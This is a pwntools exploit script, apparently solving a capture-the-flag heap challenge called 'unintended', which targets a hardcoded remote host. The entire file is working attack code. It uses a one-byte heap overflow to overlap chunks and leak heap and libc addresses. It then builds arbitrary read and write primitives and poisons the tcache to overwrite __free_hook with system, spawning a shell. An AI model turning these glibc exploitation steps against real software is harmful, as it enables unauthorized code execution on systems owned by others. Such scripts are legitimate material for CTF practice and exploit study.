#!/usr/bin/env python3

from pwn import *

the_binary = "./unintended"
context.binary = the_binary
elf = context.binary
libc = ELF("./lib/libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("193.57.159.27", 29070)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        # pie break *0x15ea
        continue
    """)

def menu(choice):
    io.sendlineafter("> ", str(choice))

def send_index(idx):
    io.sendlineafter("Challenge number: ", str(idx))

def create_challenge(idx, name, desc, points=100, category="web", desc_len=None):
    if desc_len is None:
        desc_len = len(desc)

    menu(1)
    send_index(idx)
    io.sendafter("category: ", category)
    io.sendafter("name: ", name)
    io.sendlineafter("description length: ", str(desc_len))
    io.sendafter("description: ", desc)
    io.sendlineafter("Points: ", str(points))

def patch_challenge(idx, desc):
    menu(2)
    send_index(idx)

    io.sendafter("description: ", desc)

def deploy_challenge(idx):
    menu(3)
    send_index(idx)

def delete_challenge(idx):
    menu(4)
    send_index(idx)

create_challenge(6, name="challenge_6", desc="Z"*0x18)
create_challenge(0, name="challenge_0", desc="A"*0x18)
create_challenge(1, name="challenge_1", desc="B"*0x18)
create_challenge(2, name="challenge_2", desc="C"*0x18)
create_challenge(3, name="challenge_3", desc="D"*0x18)
create_challenge(4, name="challenge_4", desc="E"*0x18, desc_len=0x1000)
create_challenge(5, name="challenge_5", desc="/bin/sh\x00", desc_len=0x18)

# One-byte overflow from A's description into the chunk size of B's entry
# chunk. We set the size so it overlaps C's entry and description chunks.
patch_challenge(0, b"a"*0x18 + p8(0x40 + 0x20 + 0x40 + 1))
delete_challenge(1)

# C's entry and description chunks are now completely overlapped by a chunk of
# size 0xa0. We get this 0xa0-sized chunk served to us from the tcache for
# a new challenge.
fake_desc = b"z"*0x60 + b"web" + b"z"*(0x20-3)
create_challenge(1, name="overlapper", desc=fake_desc, desc_len=(0xa0-0x10))

# Heap leak due to 0x80-sized description we placed right up against a heap
# address that remained in the overlapped chunk that was allocated for the
# overlapper's description.
deploy_challenge(1)
io.recvuntil(b"Description: " + fake_desc)
raw_leak = io.recvuntil("\n", drop=True)
heap_leak = u64(raw_leak.ljust(8, b"\x00"))
heap_base = heap_leak - 0x3c0
log.info("Heap leak: %#x" % heap_leak)
log.info("Heap base: %#x" % heap_base)

# Craft arbitrary r/w primitives by overwriting the overlapped challenge
# chunk's description pointer.
def arb_read(where, is_addr=True):
    delete_challenge(1)
    create_challenge(1, name="overlapper", desc=fake_desc + p64(where), desc_len=(0xa0-0x10))
    deploy_challenge(2)

    io.recvuntil("Description: ")
    raw_leak = io.recvuntil("\n", drop=True)
    if is_addr:
        return u64(raw_leak.ljust(8, b"\x00"))
    else:
        return raw_leak

# This is a limited arbitrary write, as we can only write over consecutive
# non-null data.
def arb_write(where, what):
    delete_challenge(1)
    create_challenge(1, name="overlapper", desc=fake_desc + p64(where)[:6], desc_len=(0xa0-0x10))
    patch_challenge(2, desc=what[:6])

# Get a libc pointer on the heap.
delete_challenge(4)

# Leak via arbitrary read.
libc_leak = arb_read(heap_base + 0x480)
log.info("libc leak: %#x" % libc_leak)
libc.address = libc_leak - 0x3ebca0
log.info("libc base: %#x" % libc.address)

# Set up a chunk overlapping __free_hook via corrupted tcache fd pointer.
arb_write(heap_base + 0x50, p64(libc.sym.__free_hook))
create_challenge(7, name="challenge_7", desc=p64(libc.sym.system))
delete_challenge(5)

io.interactive()
